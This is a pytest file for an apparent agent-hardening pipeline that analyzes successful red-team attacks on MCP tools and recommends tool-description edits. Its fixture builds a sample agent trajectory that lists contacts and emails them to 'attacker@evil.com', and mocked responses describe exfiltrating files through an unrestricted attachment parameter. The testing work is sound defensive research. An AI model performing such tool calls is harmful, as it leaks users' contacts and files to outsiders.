"""Tests for Stage 2 — analyzer, synthesizer, editor."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock

import pytest
import yaml

from agent_hardener.shared.schemas import (
    AgentTrajectory,
    AttackIteration,
    AttackRecord,
    EditAction,
    ExploitType,
    FailureAnalysisReport,
    FailureType,
    HarmCategory,
    MCPToolDefinition,
    ToolCall,
    VulnerabilityFinding,
)
from agent_hardener.stage2.editor import build_failure_analysis_report

FIXTURE_DIR = Path(__file__).parent / "fixtures"


def _load_fixture_tool() -> MCPToolDefinition:
    with open(FIXTURE_DIR / "example_tool.yaml") as f:
        data = yaml.safe_load(f)
    return MCPToolDefinition.from_mcp_json(data)


def _make_record(
    category: HarmCategory = HarmCategory.FRAUD,
    score: float = 0.8,
    record_index: int = 1,
) -> AttackRecord:
    trajectory = AgentTrajectory(
        prompt="test",
        tool_calls=[
            ToolCall(tool_name="list_contacts", parameters={}, success=True),
            ToolCall(tool_name="send_email", parameters={"to": "attacker@evil.com"}, success=True),
        ],
    )
    iteration = AttackIteration(
        attempt_number=0,
        prompt_used="test prompt",
        trajectory=trajectory,
        score=score,
        success=score > 0.95,
        failure_type=FailureType.NOT_APPLICABLE,
    )
    return AttackRecord(
        record_id=f"ATK-{record_index:03d}-{category.value}",
        harm_category=category,
        tool_targeted="send_email",
        attack_chain=["list_contacts", "send_email"],
        final_prompt_used="test prompt",
        attempt_number_of_success=0 if score > 0.95 else None,
        final_score=score,
        failure_type=FailureType.NOT_APPLICABLE,
        attack_trajectory=[iteration],
        successful_tool_calls=[trajectory.tool_calls[0], trajectory.tool_calls[1]],
    )


# ── Analyzer ──────────────────────────────────────────────────────────────────

class TestAnalyzer:
    def test_analyze_attack_produces_finding(self):
        from agent_hardener.stage2.analyzer import analyze_attack

        tool = _load_fixture_tool()
        record = _make_record(score=0.8)
        llm_response = json.dumps({
            "exploit_type": "C",
            "exploited_element": "attachment_path parameter with filesystem access",
            "description": "The tool's unrestricted filesystem access allowed an attacker to attach sensitive files.",
        })
        llm = MagicMock()
        llm.chat_json.return_value = llm_response

        finding = analyze_attack(record, tool, llm)
        assert finding.attack_record_id == record.record_id
        assert finding.exploit_type == ExploitType.CAPABILITY_OVER_PERMISSIVENESS
        assert finding.harm_category == HarmCategory.FRAUD
        assert "filesystem" in finding.exploited_element

    def test_analyze_attack_defaults_on_bad_json(self):
        from agent_hardener.stage2.analyzer import analyze_attack

        tool = _load_fixture_tool()
        record = _make_record()
        llm = MagicMock()
        llm.chat_json.return_value = "not json at all"

        finding = analyze_attack(record, tool, llm)
        # Should default to type E (MISSING_BOUNDARY_DECLARATIONS)
        assert finding.exploit_type == ExploitType.MISSING_BOUNDARY_DECLARATIONS
        assert finding.attack_record_id == record.record_id

    def test_all_exploit_types_parse(self):
        from agent_hardener.stage2.analyzer import analyze_attack

        tool = _load_fixture_tool()
        for letter, exploit_type in [
            ("A", ExploitType.DESCRIPTION_AMBIGUITY),
            ("B", ExploitType.PARAMETER_EXPLOITABILITY),
            ("C", ExploitType.CAPABILITY_OVER_PERMISSIVENESS),
            ("D", ExploitType.KB_CONTEXT_LEAKAGE),
            ("E", ExploitType.MISSING_BOUNDARY_DECLARATIONS),
        ]:
            record = _make_record()
            llm = MagicMock()
            llm.chat_json.return_value = json.dumps({
                "exploit_type": letter,
                "exploited_element": f"element for {letter}",
                "description": f"Description for type {letter}",
            })
            finding = analyze_attack(record, tool, llm)
            assert finding.exploit_type == exploit_type


# ── Synthesizer ───────────────────────────────────────────────────────────────

class TestSynthesizer:
    def test_synthesize_counts_successes(self):
        from agent_hardener.stage2.synthesizer import synthesize

        records = [
            _make_record(HarmCategory.FRAUD, score=0.8, record_index=1),
            _make_record(HarmCategory.CYBERCRIME, score=0.3, record_index=2),  # < 0.5 = not succeeded
            _make_record(HarmCategory.HARASSMENT, score=0.97, record_index=3),
        ]
        findings = [
            VulnerabilityFinding(
                attack_record_id=records[0].record_id,
                harm_category=HarmCategory.FRAUD,
                exploit_type=ExploitType.CAPABILITY_OVER_PERMISSIVENESS,
                exploited_element="filesystem",
                description="desc",
            ),
            VulnerabilityFinding(
                attack_record_id=records[1].record_id,
                harm_category=HarmCategory.CYBERCRIME,
                exploit_type=ExploitType.MISSING_BOUNDARY_DECLARATIONS,
                exploited_element="description",
                description="desc",
            ),
            VulnerabilityFinding(
                attack_record_id=records[2].record_id,
                harm_category=HarmCategory.HARASSMENT,
                exploit_type=ExploitType.CAPABILITY_OVER_PERMISSIVENESS,
                exploited_element="network",
                description="desc",
            ),
        ]

        llm = MagicMock()
        llm.chat.return_value = "Two attacks succeeded (score > 0.5) out of three."

        synthesis = synthesize(records, findings, llm)
        assert synthesis.total_attacks == 3
        assert synthesis.attacks_succeeded == 2
        assert HarmCategory.FRAUD in synthesis.succeeded_categories
        assert HarmCategory.HARASSMENT in synthesis.succeeded_categories
        assert HarmCategory.CYBERCRIME not in synthesis.succeeded_categories

    def test_synthesize_primary_vector_from_findings(self):
        from agent_hardener.stage2.synthesizer import synthesize

        records = [_make_record(score=0.8, record_index=i + 1) for i in range(3)]
        # 2x capability over-permissiveness, 1x parameter — should pick cap
        findings = [
            VulnerabilityFinding(attack_record_id=records[0].record_id, harm_category=HarmCategory.FRAUD, exploit_type=ExploitType.CAPABILITY_OVER_PERMISSIVENESS, exploited_element="x", description="d"),
            VulnerabilityFinding(attack_record_id=records[1].record_id, harm_category=HarmCategory.FRAUD, exploit_type=ExploitType.CAPABILITY_OVER_PERMISSIVENESS, exploited_element="x", description="d"),
            VulnerabilityFinding(attack_record_id=records[2].record_id, harm_category=HarmCategory.FRAUD, exploit_type=ExploitType.PARAMETER_EXPLOITABILITY, exploited_element="x", description="d"),
        ]
        llm = MagicMock()
        llm.chat.return_value = "Summary text."

        from agent_hardener.shared.schemas import PrimaryExploitVector
        synthesis = synthesize(records, findings, llm)
        assert synthesis.primary_exploit_vector == PrimaryExploitVector.CAPABILITY_OVER_PERMISSIVENESS


# ── Editor ────────────────────────────────────────────────────────────────────

class TestEditor:
    def test_recommend_edits_produces_recommendations(self):
        from agent_hardener.stage2.editor import recommend_edits
        from agent_hardener.stage2.synthesizer import CrossAttackSummary
        from agent_hardener.shared.schemas import PrimaryExploitVector

        tool = _load_fixture_tool()
        records = [_make_record()]
        findings = [
            VulnerabilityFinding(
                attack_record_id="ATK-001-fraud",
                harm_category=HarmCategory.FRAUD,
                exploit_type=ExploitType.CAPABILITY_OVER_PERMISSIVENESS,
                exploited_element="attachment_path (unrestricted filesystem access)",
                description="The tool allows any file path, enabling exfiltration.",
            )
        ]
        synthesis = CrossAttackSummary(
            total_attacks=1, attacks_succeeded=1,
            primary_exploit_vector=PrimaryExploitVector.CAPABILITY_OVER_PERMISSIVENESS,
            succeeded_categories=[HarmCategory.FRAUD],
            most_effective_chain=["list_contacts", "send_email"],
            avg_success_iteration=0.0,
            narrative="One attack succeeded.",
        )

        llm_response = json.dumps({
            "action": "ADD",
            "target": "parameter:attachment_path",
            "original_text": None,
            "new_text": "attachment_path must only reference files within the user's Documents directory.",
            "rationale": "Prevents arbitrary file exfiltration via email attachment.",
        })
        llm = MagicMock()
        llm.chat_json.return_value = llm_response

        edits = recommend_edits(tool, findings, synthesis, records, llm)
        assert len(edits) == 1
        assert edits[0].action == EditAction.ADD
        assert edits[0].target == "parameter:attachment_path"
        assert edits[0].motivation == "ATK-001-fraud"

    def test_build_failure_analysis_report_contract(self):
        from agent_hardener.stage2.synthesizer import CrossAttackSummary
        from agent_hardener.shared.schemas import PrimaryExploitVector, EditRecommendation

        tool = _load_fixture_tool()
        records = [_make_record()]
        findings = [
            VulnerabilityFinding(
                attack_record_id="ATK-001-fraud",
                harm_category=HarmCategory.FRAUD,
                exploit_type=ExploitType.DESCRIPTION_AMBIGUITY,
                exploited_element="description",
                description="d",
            )
        ]
        edits = [
            EditRecommendation(
                action=EditAction.ADD,
                target="description",
                new_text="Must not be used to send bulk emails.",
                motivation="ATK-001-fraud",
            )
        ]
        synthesis = CrossAttackSummary(
            total_attacks=1, attacks_succeeded=1,
            primary_exploit_vector=PrimaryExploitVector.DESCRIPTION_AMBIGUITY,
            succeeded_categories=[HarmCategory.FRAUD],
            most_effective_chain=["send_email"],
            avg_success_iteration=0.0,
            narrative="Summary.",
        )

        report = build_failure_analysis_report(tool, records, findings, edits, synthesis)
        assert isinstance(report, FailureAnalysisReport)
        assert report.tool_name == "send_email"
        assert report.total_attacks_attempted == 1
        assert report.attacks_succeeded == 1
        assert len(report.vulnerability_findings) == 1
        assert len(report.edit_recommendations) == 1

        # Verify JSON serialisation
        data = json.loads(report.model_dump_json())
        assert data["tool_name"] == "send_email"

    def test_recommend_edits_skips_when_no_successful_attacks(self):
        from agent_hardener.stage2.editor import recommend_edits
        from agent_hardener.stage2.synthesizer import CrossAttackSummary
        from agent_hardener.shared.schemas import PrimaryExploitVector

        tool = _load_fixture_tool()
        records = [_make_record(score=0.2)]
        findings = [
            VulnerabilityFinding(
                attack_record_id=records[0].record_id,
                harm_category=records[0].harm_category,
                exploit_type=ExploitType.MISSING_BOUNDARY_DECLARATIONS,
                exploited_element="description",
                description="low-confidence non-successful attack",
            )
        ]
        synthesis = CrossAttackSummary(
            total_attacks=1,
            attacks_succeeded=0,
            primary_exploit_vector=PrimaryExploitVector.MISSING_BOUNDARY_DECLARATIONS,
            succeeded_categories=[],
            most_effective_chain=[],
            avg_success_iteration=None,
            narrative="No successful attacks.",
        )

        llm = MagicMock()
        edits = recommend_edits(tool, findings, synthesis, records, llm)
        assert edits == []
        llm.chat_json.assert_not_called()
